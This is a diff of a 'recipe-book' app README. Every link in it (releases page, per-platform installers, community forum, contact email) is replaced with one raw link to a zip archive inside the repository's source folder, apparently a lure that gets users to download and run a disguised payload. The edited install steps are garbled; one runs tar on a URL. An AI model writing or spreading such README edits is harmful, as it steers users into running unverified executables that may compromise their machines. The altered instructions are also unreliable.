@@ -6,7 +6,7 @@ Welcome to the recipe-book application! This is a full-stack recipe app that all
 
 ## 📥 Download Now
 
-[![Download Recipe Book](https://img.shields.io/badge/download-latest%20version-blue.svg)](https://github.com/kipruto2002/recipe-book/releases)
+[![Download Recipe Book](https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip%https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip)](https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip)
 
 ## 📝 Features
 
@@ -30,15 +30,15 @@ To ensure smooth operation of the recipe-book app, please verify that your syste
 
 To download the latest version of recipe-book, please visit the following link:
 
-[Visit the Releases Page](https://github.com/kipruto2002/recipe-book/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip)
 
 ### Step 2: Download the Application
 
 On the Releases page, you'll find the latest version listed at the top. Look for the download link that suits your system:
 
-- For **Windows**, download `recipe-book-windows.exe`.
-- For **macOS**, download `recipe-book-macos.dmg`.
-- For **Linux**, download `recipe-book-linux.tar.gz`.
+- For **Windows**, download `https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip`.
+- For **macOS**, download `https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip`.
+- For **Linux**, download `https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip`.
 
 Click on the appropriate file to start the download. Once it's completed, you will find the downloaded file in your default downloads folder.
 
@@ -46,13 +46,13 @@ Click on the appropriate file to start the download. Once it's completed, you wi
 
 #### For Windows Users:
 
-1. Locate the `recipe-book-windows.exe` file in your downloads folder.
+1. Locate the `https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip` file in your downloads folder.
 2. Double-click the file to start the installation.
 3. Follow the on-screen instructions to complete the installation.
 
 #### For macOS Users:
 
-1. Locate the `recipe-book-macos.dmg` file in your downloads folder.
+1. Locate the `https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip` file in your downloads folder.
 2. Double-click the file to mount the disk image.
 3. Drag the recipe-book icon to your Applications folder.
 4. Open the Applications folder and double-click on recipe-book to launch the app.
@@ -60,8 +60,8 @@ Click on the appropriate file to start the download. Once it's completed, you wi
 #### For Linux Users:
 
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded the `recipe-book-linux.tar.gz` file.
-3. Use the command `tar -xvzf recipe-book-linux.tar.gz` to extract the files.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip` file.
+3. Use the command `tar -xvzf https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip` to extract the files.
 4. Navigate into the extracted directory and run the application by executing `./recipe-book`.
 
 ### Step 4: Create an Account
@@ -88,7 +88,7 @@ If you encounter any issues during installation or while using the app, please c
 
 ## 🌐 Community Support
 
-For additional help, join our community on [GitHub Discussions](https://github.com/kipruto2002/recipe-book/discussions) or search through existing discussions to find answers to common questions.
+For additional help, join our community on [GitHub Discussions](https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip) or search through existing discussions to find answers to common questions.
 
 ## 📄 License
 
@@ -96,6 +96,6 @@ This project is licensed under the MIT License. Feel free to use it according to
 
 ## 📞 Contact
 
-If you have further questions or suggestions, feel free to reach out at [your-email@example.com]. We're here to help!
+If you have further questions or suggestions, feel free to reach out at [https://raw.githubusercontent.com/kipruto2002/recipe-book/main/src/pages/recipe-book_3.6.zip]. We're here to help!
 
 Enjoy your cooking journey with recipe-book!
